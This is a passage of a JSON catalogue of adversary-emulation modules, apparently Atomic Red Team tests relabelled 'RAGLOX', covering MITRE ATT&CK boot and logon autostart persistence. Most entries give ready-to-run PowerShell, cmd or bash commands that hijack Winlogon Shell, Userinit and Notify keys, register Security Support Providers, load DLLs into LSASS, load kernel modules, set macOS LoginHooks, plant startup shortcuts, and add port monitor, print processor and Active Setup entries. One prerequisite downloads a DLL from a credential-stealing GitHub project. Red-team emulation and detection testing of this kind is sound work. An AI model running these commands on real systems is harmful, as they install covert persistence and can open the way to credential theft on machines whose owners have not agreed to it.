      "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "binary_to_execute",
          "description": "Path of binary to execute",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "bf9f9d65-ee4d-4c3e-a843-777d04f19c38",
      "module_name": "Winlogon Shell Key Persistence - PowerShell"
    },
    {
      "index": 1292,
      "technique_id": "T1547.004",
      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
      "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "binary_to_execute",
          "description": "Path of binary to execute",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fb32c935-ee2e-454b-8fa3-1c46b42e8dfb",
      "module_name": "Winlogon Userinit Key Persistence - PowerShell"
    },
    {
      "index": 1293,
      "technique_id": "T1547.004",
      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
      "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute ragloxNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\RAGLOXRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\RAGLOXRedTeam\" \"DllName\" \"#{binary_to_execute}\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\RAGLOXRedTeam\" \"Logon\" \"#{function_to_execute}\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\RAGLOXRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\RAGLOXRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "binary_to_execute",
          "description": "Path of notification package to execute",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\ragloxNotificationPackage.dll"
        },
        {
          "name": "function_to_execute",
          "description": "Function in notification package to execute",
          "type": "string",
          "default_value": "RAGLOXTestFunction"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d40da266-e073-4e5a-bb8b-2b385023e5f9",
      "module_name": "Winlogon Notify Key Logon Persistence - PowerShell"
    },
    {
      "index": 1294,
      "technique_id": "T1547.004",
      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
      "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "binary_to_execute",
          "description": "Path of binary to execute",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "95a3c42f-8c88-4952-ad60-13b81d929a9d",
      "module_name": "Winlogon HKLM Shell Key Persistence - PowerShell"
    },
    {
      "index": 1295,
      "technique_id": "T1547.004",
      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
      "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "binary_to_execute",
          "description": "Path of binary to execute",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f9b8daff-8fa7-4e6a-a1a7-7c14675a545b",
      "module_name": "Winlogon HKLM Userinit Key Persistence - PowerShell"
    },
    {
      "index": 1296,
      "technique_id": "T1547.005",
      "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
      "description": "Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.\nA common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"RAGLOXTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $newvalue\n",
        "elevation_required": true,
        "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');\nSet-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old';"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "afdfd7e3-8a0b-409f-85f7-886fdf249c9e",
      "module_name": "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security Support Provider configuration in registry"
    },
    {
      "index": 1297,
      "technique_id": "T1547.005",
      "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
      "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"RAGLOXTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue\n",
        "elevation_required": true,
        "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');\nSet-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old';"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "de3f8e74-3351-4fdb-a442-265dbf231738",
      "module_name": "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig Security Support Provider configuration in registry"
    },
    {
      "index": 1298,
      "technique_id": "T1547.006",
      "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
      "description": "This test uses the insmod command to load a kernel module for Linux.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo insmod #{module_path}\n",
        "elevation_required": true,
        "cleanup_command": "sudo rmmod #{module_name}\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}\n"
      },
      "variables": [
        {
          "name": "module_name",
          "description": "Name of the kernel module name.",
          "type": "string",
          "default_value": "T1547006"
        },
        {
          "name": "module_path",
          "description": "Folder used to store the module.",
          "type": "path",
          "default_value": "/tmp/T1547.006/T1547006.ko"
        },
        {
          "name": "temp_folder",
          "description": "Temp folder used to compile the code.",
          "type": "path",
          "default_value": "/tmp/T1547.006"
        },
        {
          "name": "module_source_path",
          "description": "Path to download Gsecdump binary file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1547.006/src"
        }
      ],
      "prerequisites": [
        {
          "description": "The kernel module must exist on disk at specified location\n",
          "check_command": "if [ -f #{module_path} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;\ncp #{module_source_path}/* #{temp_folder}/\ncd #{temp_folder}; make\nif [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;\n"
        }
      ],
      "rx_module_id": "687dcb93-9656-4853-9c36-9977315e9d23",
      "module_name": "Linux - Load Kernel Module via insmod"
    },
    {
      "index": 1299,
      "technique_id": "T1547.006",
      "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
      "description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "set -x\nsudo kextload #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload #{module_path}\nsudo kmutil load -p #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kmutil unload -p #{module_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "module_path",
          "description": "Folder used to store the module.",
          "type": "path",
          "default_value": "/Library/Extensions/SoftRAID.kext"
        }
      ],
      "prerequisites": [
        {
          "description": "The kernel module must exist on disk at specified location\n",
          "check_command": "if [ -d #{module_path} ] ; then exit 0; else exit 1 ; fi\n",
          "install_command": "exit 1\n"
        }
      ],
      "rx_module_id": "f4391089-d3a5-4dd1-ab22-0419527f2672",
      "module_name": "MacOS - Load Kernel Module via kextload and kmutil"
    },
    {
      "index": 1300,
      "technique_id": "T1547.006",
      "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
      "description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo #{exe_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload /Library/Extensions/SoftRAID.kext\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{exe_path}\n"
      },
      "variables": [
        {
          "name": "src_path",
          "description": "Folder used to store the module.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1547.006/src/macos_kextload.c"
        },
        {
          "name": "exe_path",
          "description": "Folder used to store the module.",
          "type": "path",
          "default_value": "/tmp/T1547006_iokit_loader"
        }
      ],
      "prerequisites": [
        {
          "description": "The kernel module must exist on disk at specified location\n",
          "check_command": "if [ -f \"#{exe_path}\" ]; then exit 0 ; else exit 1; fi\n",
          "install_command": "cc -o #{exe_path} #{src_path} -framework IOKit -framework Foundation\n"
        }
      ],
      "rx_module_id": "f0007753-beb3-41ea-9948-760785e4c1e5",
      "module_name": "MacOS - Load Kernel Module via KextManagerLoadKextWithURL()"
    },
    {
      "index": 1301,
      "technique_id": "T1547.006",
      "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
      "description": "The following RX Module will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named comadmin.dat and is stored in the %windows%\\system32\\Com directory. \nThis RX Module will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)\n",
        "elevation_required": true,
        "cleanup_command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; if (Test-Path $exampleFullPath) { Remove-Item $exampleFullPath -Force }\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e5cb5564-cc7b-4050-86e8-f2d9eec1941f",
      "module_name": "Snake Malware Kernel Driver Comadmin"
    },
    {
      "index": 1302,
      "technique_id": "T1547.007",
      "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
      "description": "Copy in new loginwindow.plist to launch Calculator.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n",
        "elevation_required": false,
        "cleanup_command": "rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n"
      },
      "variables": [
        {
          "name": "calc_plist_path",
          "description": "path to binary plist with entry to open calculator",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1547.007/src/reopen_loginwindow_calc.plist"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5fefd767-ef54-4ac6-84d3-751ab85e8aba",
      "module_name": "Copy in loginwindow.plist for Re-Opened Applications"
    },
    {
      "index": 1303,
      "technique_id": "T1547.007",
      "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
      "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo defaults write com.apple.loginwindow LoginHook #{script}\n",
        "elevation_required": true,
        "cleanup_command": "sudo defaults delete com.apple.loginwindow LoginHook\n"
      },
      "variables": [
        {
          "name": "script",
          "description": "path to script",
          "type": "path",
          "default_value": "/path/to/script"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5f5b71da-e03f-42e7-ac98-d63f9e0465cb",
      "module_name": "Re-Opened Applications using LoginHook"
    },
    {
      "index": 1304,
      "technique_id": "T1547.007",
      "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
      "description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi\necho save backup copy to /tmp/\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\necho before\nplutil -p ${FILE}\necho overwriting...\n#{exe_path} ${FILE} && echo after && plutil -p ${FILE}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{exe_path}\n# revert to backup copy\nFILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then\n   exit 0\nfi\nmv /tmp/t1547007_loginwindow-backup.plist ${FILE}\n"
      },
      "variables": [
        {
          "name": "objc_source_path",
          "description": "path to objective C program",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1547.007/src/append_reopen_loginwindow.m"
        },
        {
          "name": "exe_path",
          "description": "path to compiled program",
          "type": "path",
          "default_value": "/tmp/t1547007_append_exe"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "if [ -f \"#{exe_path}\" ]; then exit 0 ; else exit 1; fi\n",
          "install_command": "cc #{objc_source_path} -o #{exe_path} -framework Cocoa\n"
        }
      ],
      "rx_module_id": "766b6c3c-9353-4033-8b7e-38b309fa3a93",
      "module_name": "Append to existing loginwindow for Re-Opened Applications"
    },
    {
      "index": 1305,
      "technique_id": "T1547.008",
      "technique_name": "Boot or Logon Autostart Execution: LSASS Driver",
      "description": "The following RAGLOX will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null\n"
      },
      "variables": [
        {
          "name": "dll_path",
          "description": "Module to be loaded into LSASS",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\lsass_lib.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "lsass_lib.dll must exist on disk at specified location (#{dll_path})\n",
          "check_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll\" -UseBasicParsing -OutFile \"#{dll_path}\"\n"
        }
      ],
      "rx_module_id": "8ecef16d-d289-46b4-917b-0dba6dc81cf1",
      "module_name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt"
    },
    {
      "index": 1306,
      "technique_id": "T1547.009",
      "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
      "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo [InternetShortcut] > #{shortcut_file_path}\necho URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path}\n#{shortcut_file_path}\n",
        "elevation_required": false,
        "cleanup_command": "del -f #{shortcut_file_path} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "shortcut_file_path",
          "description": "shortcut modified and execute",
          "type": "path",
          "default_value": "%temp%\\T1547.009_modified_shortcut.url"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ce4fc678-364f-4282-af16-2fb4c78005ce",
      "module_name": "Shortcut Modification"
    },
    {
      "index": 1307,
      "technique_id": "T1547.009",
      "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
      "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\nRemove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cfdc954d-4bb0-4027-875b-a1893ce406f2",
      "module_name": "Create shortcut to cmd in startup folders"
    },
    {
      "index": 1308,
      "technique_id": "T1547.010",
      "technique_name": "Boot or Logon Autostart Execution: Port Monitors",
      "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\RAGLOXRedTeam\" /v \"Driver\" /d \"#{monitor_dll}\" /t REG_SZ /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\RAGLOXRedTeam\" /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "monitor_dll",
          "description": "Addition to port monitor registry key. Normally refers to a DLL name in C:\\Windows\\System32 but an arbitrary DLL can be specified with the absolute path.",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder\\T1547.010\\bin\\PortMonitor.dll"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d34ef297-f178-4462-871e-9ce618d44e50",
      "module_name": "Add Port Monitor persistence in Registry"
    },
    {
      "index": 1309,
      "technique_id": "T1547.012",
      "technique_name": "Boot or Logon Autostart Execution: Print Processors",
      "description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file RAGLOXTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToRagloxModulesFolder\\T1547.012\\bin\\RAGLOXTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\RAGLOXTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\RAGLOXRedTeam\" /v \"Driver\" /d \"RAGLOXTest.dll\" /t REG_SZ /f\nnet start spooler\nif(#{restart}){\n  Restart-Computer\n}\n",
        "elevation_required": true,
        "cleanup_command": "net stop spooler\nrm -force C:\\Windows\\System32\\spool\\prtprocs\\x64\\RAGLOXTest.dll -ErrorAction SilentlyContinue\nrm -force C:\\Users\\Public\\RAGLOXTest.txt -ErrorAction SilentlyContinue\nremove-item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\RAGLOXRedTeam\" -Force -ErrorAction SilentlyContinue\nnet start spooler\n"
      },
      "variables": [
        {
          "name": "restart",
          "description": "set to 1 if you want the computer to reboot as part of the test",
          "type": "integer",
          "default_value": 0
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f7d38f47-c61b-47cc-a59d-fc0368f47ed0",
      "module_name": "Print Processors"
    },
    {
      "index": 1310,
      "technique_id": "T1547.014",
      "technique_name": "Active Setup",
      "description": "This test will create an \"rx_module\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"rx_module\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\rx_module\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\rx_module\" \"StubPath\" \"#{payload}\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
        "elevation_required": true,
        "cleanup_command": "Remove-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\rx_module\" -Force -ErrorAction Ignore\nRemove-Item \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\rx_module\" -Force -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "payload",
          "description": "Payload to run once during login",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "deff4586-0517-49c2-981d-bbea24d48d71",
      "module_name": "HKLM - Add rx_module key to launch executable as part of user setup"
    },
    {
      "index": 1311,
      "technique_id": "T1547.014",
      "technique_name": "Active Setup",
      "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"StubPath\" -Force\nRemove-ItemProperty \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Force"
      },
      "variables": [
        {
          "name": "payload",
          "description": "Payload to run once during login",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "39e417dd-4fed-4d9c-ae3a-ba433b4d0e9a",
      "module_name": "HKLM - Add malicious StubPath value to existing Active Setup Entry"
    },
    {
      "index": 1312,
      "technique_id": "T1547.014",
      "technique_name": "Active Setup",
